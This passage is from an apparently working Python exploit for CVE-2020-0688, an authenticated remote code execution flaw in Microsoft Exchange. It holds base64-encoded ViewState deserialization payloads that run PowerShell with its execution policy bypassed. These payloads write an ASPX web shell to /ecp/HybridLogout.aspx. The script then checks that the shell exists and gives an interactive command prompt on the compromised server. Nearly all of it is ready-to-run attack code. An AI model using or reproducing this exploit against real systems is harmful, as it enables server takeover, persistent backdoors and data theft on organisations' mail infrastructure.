        "/wEyogcAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAIcGPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M%2BPGE6UHJvY2Vzcy5TdGFydEluZm8%2BPGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtZXAgYnlwYXNzIC1jICZxdW90O1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ1BDOTRjMnc2ZEdWdGNHeGhkR1UrUEM5NGMydzZjM1I1YkdWemFHVmxkRDRpTzFodGJFUnZZM1Z0Wlc1MElIaHRiR1J2WXoxdVpYY2dXRzFzUkc5amRXMWxiblFvS1R0NGJXeGtiMk11VEc5aFpGaHRiQ2g0Yld3cE8xaHRiRVJ2WTNWdFpXNTBJSGh6YkdSdll6MXVaWGNnV0cxc1JHOWpkVzFsYm5Rb0tUdDRjMnhrYjJNdVRHOWhaRmh0YkNoNGMyeDBLVHM9JykpJnF1b3Q7ICZndDsmZ3Q7ICZxdW90OyVleGNoYW5nZWluc3RhbGxwYXRoJVxcQ2xpZW50QWNjZXNzXFxlY3BcXEh5YnJpZExvZ291dC5hc3B4JnF1b3Q7IiBGaWxlTmFtZT0iY21kIi8%2BPC9hOlByb2Nlc3MuU3RhcnRJbmZvPjwvYTpQcm9jZXNzPjwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjwvT2JqZWN0RGF0YVByb3ZpZGVyPgvrctQK4picFhnxgigV95%2BOvoyIvg%3D%3D",
        "/wEyoggAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAAIcHPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M%2BPGE6UHJvY2Vzcy5TdGFydEluZm8%2BPGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwgLW5vcCAtZXAgYnlwYXNzIC1jICZxdW90O1tTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJ1dITnNkRk5sZEhScGJtZHpJSGh6YkhSZmMyVjBkR2x1WjNNZ1BTQnVaWGNnV0hOc2RGTmxkSFJwYm1kektHWmhiSE5sTENCMGNuVmxLVHQ0YzJ4MFgzTmxkSFJwYm1kekxrVnVZV0pzWlZOamNtbHdkQ0E5SUhSeWRXVTdXSE5zUTI5dGNHbHNaV1JVY21GdWMyWnZjbTBnZUdOMFBXNWxkeUJZYzJ4RGIyMXdhV3hsWkZSeVlXNXpabTl5YlNncE8zaGpkQzVNYjJGa0tIaHpiR1J2WXl4NGMyeDBYM05sZEhScGJtZHpMRzVsZHlCWWJXeFZjbXhTWlhOdmJIWmxjaWdwS1R0NFkzUXVWSEpoYm5ObWIzSnRLSGh0YkdSdll5eHVkV3hzTEc1bGR5Qk5aVzF2Y25sVGRISmxZVzBvS1NrN0pUNEsnKSkmcXVvdDsgJmd0OyZndDsgJnF1b3Q7JWV4Y2hhbmdlaW5zdGFsbHBhdGglXFxDbGllbnRBY2Nlc3NcXGVjcFxcSHlicmlkTG9nb3V0LmFzcHgmcXVvdDsiIEZpbGVOYW1lPSJjbWQiLz48L2E6UHJvY2Vzcy5TdGFydEluZm8%2BPC9hOlByb2Nlc3M%2BPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2BPC9PYmplY3REYXRhUHJvdmlkZXI%2BC4Mk50npS3MI7JRIdv48%2BuOM7DhB",
    ]
    count = 1
    for vb in viewstate_bins:
        rce_url = (
            target + "/ecp/default.aspx?__VIEWSTATEGENERATOR=" + _vsg + "&__VIEWSTATE=" + vb
        )
        resp, _ = CraftREQ(rce_url, method="GET", cookies=new_cookie, proxy=proxy)
        if resp.status_code == 500:
            print("[+] L%s. sent!" % str(count))
            count += 1
            time.sleep(1)
        else:
            print(r.text)
            sys.exit(0)
            
    print("\n[*] Checking for webshell existence...")
    rce_output = target + "/ecp/HybridLogout.aspx" # webshell
    resp, _ = CraftREQ(rce_output, method="GET", cookies=new_cookie, proxy=proxy)
    if (resp.status_code == "404") or (resp.status_code == "302"):
        print("\n[-] code:[%s] | Error [/ecp/HybridLogout.aspx] webshell..." % resp.status_code)
        print("[!] Could not get command output because some WAF's blocking")
        print("[!] Try to check for some weird Cookie values in your browser, like X-BackEndCookie")
        print("[*] Should be necessary to re-login through browser to allow your IP Request in current user session")   
        sys.exit(0)

    print("\n[+] Webshell uploaded and working at: [/ecp/HybridLogout.aspx]")
    while True:
        cmd = input("cmd> ")
        resp, _ = CraftREQ(
            rce_output + "?cmd=" + cmd, cookies=new_cookie, method="GET", proxy=proxy
        )
        print(str(re.findall(r">([^<]*)<", str(resp.text))[0]))

if __name__ == "__main__":
    print("\n------------------------------------------------------------------")
    print("Exchange [/ecp/default.aspx] - Authenticated Remote Code Execution")
    print(".NET Deserialization Vulnerability - ASPX [Web Shell] upload technique")
    print("CVE: CVE-2020-0688")
    print("Script made by: github.com/w4fz5uck5")
    print("------------------------------------------------------------------\n")
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--server", required=True, help="Exchange URL, e.g: https://site.com")
    parser.add_argument("-u", "--user", required=True, help="Login Account, e.g: domain\\user")
    parser.add_argument("-p", "--password", required=True, help="Login Password")
    parser.add_argument("-x", "--proxy", help="HTTPS proxy for debugging")
    args = parser.parse_args()
    target = args.server
    user = args.user
    password = args.password
    if args.proxy:
        proxy = {
            "https": str(args.proxy)
        }
    else:
        proxy = None
        
    exploit()
